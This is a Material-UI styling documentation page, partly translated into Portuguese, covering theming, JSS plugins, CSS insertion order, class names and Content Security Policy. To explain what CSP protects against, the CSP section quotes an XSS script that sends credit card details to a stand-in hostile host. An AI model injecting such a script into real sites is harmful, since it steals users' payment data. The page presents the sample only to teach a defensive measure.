# Advanced

<p class="description">Advanced Usage.</p>

## Theming

Add a `ThemeProvider` to the top level of your app to access the theme down the React's component tree. Then, you can access the theme object in the style functions.

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

## Accessing the theme in a component

You might need to access the theme variables inside your React components.

### `useTheme` hook

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

### `withTheme` HOC

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

## Theme nesting

You can nest multiple theme providers. This can be really useful when dealing with different area of your application that have distinct appearance from each other.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

The inner theme will **override** the outer theme. You can extend the outer theme by providing a function:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS plugins

O JSS usa o conceito de plugins para estender seu núcleo, permitindo que as pessoas selecionem os recursos de que precisam. Você paga a sobrecarga de desempenho apenas pelo que está usando. All the plugins aren't available by default. Nós adicionamos a seguinte lista:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

É um subconjunto de [ jss-preset-default ](https://cssinjs.org/jss-preset-default/). Claro, você está livre para adicionar um novo plugin. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String templates

If you prefer using the CSS syntax, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template) plugin.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## Ordem de injeção de CSS

O CSS inserido pelo Material-UI para estilizar um componente tem a maior especificidade possível, pois o `<link>` é inserido na parte inferior do `<head>` para garantir que os componentes sejam sempre renderizados corretamente.

Você pode, no entanto, também querer substituir esses estilos, por exemplo, com componentes estilizados. Se você está enfrentando um problema de ordem de injeção de CSS, o JSS [ fornece um mecanismo ](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) para lidar com essa situação. Ajustando o posicionamento do ponto de inserção ` ` dentro do seu HTML header, você pode [ controlar a ordem em ](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) que as regras CSS são aplicadas aos seus componentes.

### Comentário HTML

A abordagem mais simples é adicionar um comentário HTML que determine onde o JSS irá inserir os estilos:

```jsx
<head>
  <!-- jss-insertion-point -->
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Definimos um ponto de inserção personalizado que o JSS procurará injetando os estilos no DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### Outro elemento HTML

[Create React App](https://github.com/facebook/create-react-app) remove comentários em HTML ao criar a compilação de produção. Para contornar o problema, você pode fornecer um elemento DOM (diferente de um comentário) como o ponto de inserção do JSS.

Por exemplo, um elemento `<noscript>`:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Definimos um ponto de inserção personalizado que o JSS procurará injetando os estilos no DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### JS createComment

codesandbox.io impede o acesso ao elemento `<head>`. Para contornar o problema, você pode usar a API JavaScript `document.createComment()`:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Definimos um ponto de inserção personalizado que o JSS procurará injetando os estilos no DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server Side Rendering

## Class names

Você deve ter notado que os nomes de classe gerados pela nossa solução de estilo são **não-determinísticos**, para que você não pode contar com eles para ficar na mesma. The class names are generated by [our class name generator](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Let's take the following style as an example:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

It will generate a `AppBar-root-5pbwdt` class name. However, the following CSS won't work:

```css
.AppBar-root-5pbwdt {
  opacity: 0.6;
}
```

You have to use the `classes` property of a component to override them. Thanks to the non-deterministic nature of our class names, we can implement optimizations for development and production. Eles são fáceis de depurar no desenvolvimento e tão curtos quanto possível na produção:

- In **development**, the class name will be: `.AppBar-root-5pbwdt`, following this logic:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 5pbwdt;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name will be: `.jss5pbwdt`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 5pbwdt;

const className = `${productionPrefix}-${identifier}`;
```

Se você não gostar desse comportamento padrão, poderá alterá-lo. O JSS conta com o conceito de [gerador de nome de classe](https://cssinjs.org/jss-api/#generate-your-class-names).

## Global CSS

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

You can also combine JSS generated class names with global ones.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministic class names

We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. Quando ativado, os nomes das classes ficarão assim:

- development: `.AppBar-root`
- production: `.AppBar-root`

⚠️ **Be cautious when using `dangerouslyUseGlobalCSS`.** Relying on it for code running in production has the following implications:

- It's harder to keep track of `classes` API changes between major releases.
- O CSS global é inerentemente frágil.

⚠️ When using `dangerouslyUseGlobalCSS` standalone (without Material-UI), you should name your style sheets using the `options` parameter:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## Content Security Policy (CSP)

### What is CSP and why is it useful?

Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### How does one implement CSP?

In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.

```jsx
<meta property="csp-nonce" content={nonce} />
```